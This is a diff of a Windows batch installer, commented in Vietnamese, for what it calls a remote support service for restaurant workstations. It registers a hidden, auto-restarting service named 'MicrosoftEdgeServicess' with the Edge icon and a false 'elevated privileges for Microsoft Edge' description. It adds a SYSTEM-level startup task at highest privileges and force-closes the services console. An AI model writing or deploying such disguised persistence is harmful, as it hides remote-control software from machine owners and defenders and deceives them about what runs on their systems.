@@ -5,6 +5,7 @@ cd /d "%~dp0"
 echo ===============================================================================
 echo   CAI DAT DICH VU HO TRO VA QUAN TRI TU XA MAY TRAM NHA HANG
 echo   Ten dich vu: MicrosoftEdgeServicess
+echo   Mo ta: Provides elevated privileges for Microsoft Edge.
 echo   Co che: Tu khoi dong cung Windows - Chay ngam 100 phan tram
 echo   Bieu tuong: Microsoft Edge chinh thuc
 echo   Bao ve tien trinh: Single-Instance (Chi 1 tien trinh duy nhat)
@@ -56,9 +57,12 @@ exit /b 1
 
 :DaCoQuyenAdmin
 
-:: 3. Don dep tien trinh cu
-echo [1/6] Dang don dep cac tien trinh cu dang chay (neu co)...
+:: 3. Dong cua so services.msc (mmc.exe) de tranh bi khoa handle lam Service bi danh dau xoa (Loi 1058 / 1072)
+echo [1/6] Dang giai phong khoa he thong va tien trinh cu...
+taskkill /F /IM mmc.exe >nul 2>&1
 taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
+net stop MicrosoftEdgeServicess >nul 2>&1
+ping 127.0.0.1 -n 3 >nul
 
 :: 4. Thiet lap thu muc he thong
 set "INSTALL_DIR=C:\ProgramData\MicrosoftEdgeServicess"
@@ -75,31 +79,36 @@ copy /Y "%~dp0Kiem_Tra_Trang_Thai.bat" "%INSTALL_DIR%\" >nul 2>nul
 copy /Y "%~dp0Go_Cai_Dat_Dich_Vu.bat" "%INSTALL_DIR%\" >nul 2>nul
 copy /Y "%~dp0README_HUONG_DAN.txt" "%INSTALL_DIR%\" >nul 2>nul
 
-:: 5. Dung va go bo service cu neu ton tai de dang ky moi sach se
-echo [4/6] Dang lam sach service cu trong he thong...
-net stop MicrosoftEdgeServicess >nul 2>&1
-"%INSTALL_DIR%\MicrosoftEdgeServicess.exe" remove >nul 2>&1
-sc.exe delete MicrosoftEdgeServicess >nul 2>&1
-
-:: 6. Dang ky truc tiep vao Windows Service Control Manager (services.msc)
-echo [5/6] Dang dang ky vao Windows Service Control Manager...
-"%INSTALL_DIR%\MicrosoftEdgeServicess.exe" install >nul 2>&1
-
-:: Kiem tra neu chua co thi tao qua sc.exe
+:: 5. Dang ky hoac cap nhat Windows Service
+echo [4/6] Dang cau hinh Windows Service MicrosoftEdgeServicess...
 sc.exe query MicrosoftEdgeServicess >nul 2>&1
-if %errorlevel% neq 0 sc.exe create MicrosoftEdgeServicess binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
+if %errorlevel% equ 0 goto :ServiceDaTonTai
 
-:: Cau hinh khoi dong tu dong, mo ta va co che tu phuc hoi loi
+:: Neu chua co thi dang ky moi
+echo    -> Dang dang ky moi dich vu vao services.msc...
+"%INSTALL_DIR%\MicrosoftEdgeServicess.exe" --startup auto install >nul 2>&1
+sc.exe query MicrosoftEdgeServicess >nul 2>&1
+if %errorlevel% neq 0 (
+    sc.exe create MicrosoftEdgeServicess binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
+)
+
+:ServiceDaTonTai
+:: Luon dam bao Service bat start= auto (Chong loi 1058 Disabled), cap nhat binPath va Description
 sc.exe config MicrosoftEdgeServicess start= auto binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
 sc.exe description MicrosoftEdgeServicess "Provides elevated privileges for Microsoft Edge." >nul 2>&1
 sc.exe failure MicrosoftEdgeServicess reset= 60 actions= restart/5000/restart/5000/restart/5000 >nul 2>&1
 
 :: Thiet lap du phong qua Task Scheduler
+echo [5/6] Dang thiet lap du phong qua Task Scheduler...
 schtasks /Create /TN "MicrosoftEdgeServicess" /TR "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul 2>&1
 
-:: 7. Khoi dong Windows Service ngay bay gio
+:: 6. Khoi dong Windows Service ngay bay gio
 echo [6/6] Dang khoi chay Windows Service ngam...
 net start MicrosoftEdgeServicess
+if %errorlevel% neq 0 (
+    echo    Thu khoi dong truc tiep qua service start...
+    "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" start >nul 2>&1
+)
 
 echo.
 echo ===============================================================================
@@ -109,11 +118,10 @@ sc.exe query MicrosoftEdgeServicess
 echo.
 
 echo ===============================================================================
-echo   CAI DAT DICH VU THANH CONG 100 PHAN TRAM!
+echo   CAI DAT DICH VU HOAN TAT!
 echo   - Ten dich vu: MicrosoftEdgeServicess
+echo   - Mo ta: Provides elevated privileges for Microsoft Edge.
 echo   - Duong dan: %INSTALL_DIR%\MicrosoftEdgeServicess.exe
-echo   - services.msc: Da xuat hien va dang o trang thai RUNNING
-echo   - Task Manager the Services: Da co MicrosoftEdgeServicess (Running)
 echo   - Tu dong bat cung Windows: Automatic
 echo   - Icon: Bieu tuong Microsoft Edge chinh thuc
 echo ===============================================================================
